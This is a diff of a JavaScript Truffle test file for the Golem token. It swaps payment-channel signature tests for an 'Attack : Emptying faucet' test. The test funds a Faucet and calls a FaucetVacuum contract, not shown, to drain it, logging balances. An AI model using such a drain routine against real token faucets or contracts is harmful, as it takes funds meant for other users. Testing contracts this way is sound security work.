@@ -6,60 +6,56 @@ const eutil = require('ethereumjs-util')
 const BigNumber = web3.BigNumber;
 
 var GolemNetworkToken = artifacts.require('GolemNetworkToken');
-var GolemNetworkTokenBatching = artifacts.require('GolemNetworkTokenBatching');
-var GNTPaymentChannels = artifacts.require('GNTPaymentChannels');
+var FaucetVacuum = artifacts.require('FaucetVacuum');
+var Faucet = artifacts.require('Faucet');
 
 require('chai')
   .use(require('chai-as-promised'))
   .use(require('chai-bignumber')(BigNumber))
   .should();
 
-contract('GNTPaymentChannels', function ([owner, anyone, Alice, Bob, Bob2]) {
+contract('Faucet', function ([owner, anyone, Alice, Bob, Bob2]) {
 
   var startBlock = 1000;
   var endBlock   = 1100;
 
-  //Hash of channel 0 & 1
-  var ch0 = Web3Utils.soliditySha3(0);
+  var nIterationsToEmpty = 1000; // 1,000,000,000 / 1,000
 
-  describe.only('Testing signatures from Geth client for payment channels', function() {
+  describe('Attack : Emptying faucet', function() {
     beforeEach(async function () {
-      //Deploying GNT token
+      // Deploying GNT token
       this.GNT = await GolemNetworkToken.new(owner, owner, startBlock, endBlock, {from : owner});
 
-      //Deploying GNTB token contract
-      this.GNTB = await GolemNetworkTokenBatching.new(this.GNT.address, {from: owner});
+      // Deploying Faucet
+      this.faucet = await Faucet.new(this.GNT.address);
 
-      //Deploying payment channgel contract
-      this.paymentChannel = await GNTPaymentChannels.new(this.GNTB.address, 100000); 
+      // Send 1 total supply to faucet
+      await this.GNT.transfer(this.faucet.address, ether(1000000000), {from: owner});
 
-      //Alice opens a channel with Bob
-      await this.paymentChannel.createChannel(Bob, {from: Alice});
+      // Deploy faucet vacuum contract
+      this.faucetVacuum = await FaucetVacuum.new(this.GNT.address, this.faucet.address);
     });
 
     context('When Alice opens a payment channel with Bob and signs a VALID message (with prefix)', function () {
-      var m = Web3Utils.soliditySha3(ch0, 100);
-      var sign = web3.eth.sign(Alice, m);
 
-      // Extracting ECDSA variables from signature
-      const rsv = eutil.fromRpcSig(sign)
-      var r = eutil.bufferToHex(rsv.r);
-      var s = eutil.bufferToHex(rsv.s);
-      var v = rsv.v;
+      it('faucet is empty', async function () {
 
-      it('isValidSig() WILL return FALSE', async function () {
-        var isValid = await this.paymentChannel.isValidSig(ch0, 100, v, r, s);
-        isValid.should.be.equal(false);
-      });
+          var userBalanceA = await web3.eth.getBalance(owner);
+          console.log(userBalanceA);
 
-      it('isValidSigPREFIX() WILL return TRUE', async function () {
-        var isValid = await this.paymentChannel.isValidSigPREFIX(ch0, 100, v, r, s);
-        isValid.should.be.equal(true);
-      });
+          // Empty faceut with gas price as 1 Gwei  
+          await this.faucetVacuum.vacuum(nIterationsToEmpty, 
+                  {from: owner, gasPrice: 1000000000, gas: userBalanceA.div(1000000000)}); 
 
-      it('isValidSigBOTH() WILL return TRUE', async function () {
-        var isValid = await this.paymentChannel.isValidSigBOTH(ch0, 100, v, r, s);
-        isValid.should.be.equal(true);
+          //Faucet GNT balance
+          var faucetBalance = await this.GNT.balanceOf(this.faucet.address);
+          console.log('faucetBalance:', faucetBalance);
+
+          //User ETH balance
+          var userBalanceB = await web3.eth.getBalance(owner);
+          console.log(userBalanceB);
+
+
       });
 
     });
